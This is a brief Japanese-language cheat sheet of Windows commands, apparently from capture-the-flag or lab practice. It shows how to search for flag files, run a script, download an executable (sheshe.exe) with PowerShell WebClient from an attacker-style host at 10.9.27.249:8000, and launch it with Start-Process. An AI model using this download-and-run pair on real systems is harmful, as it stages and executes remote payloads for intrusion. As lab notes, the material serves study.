# Windows

### fileの発見
`dir flag* /s /p`

### スクリプト実行
`.\filename`

### fileをDL
`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.27.249:8000/sheshe.exe','sheshe.exe')"`

### powershellでプロセス実行
`powershell "Start-Process "sheshe.exe""`
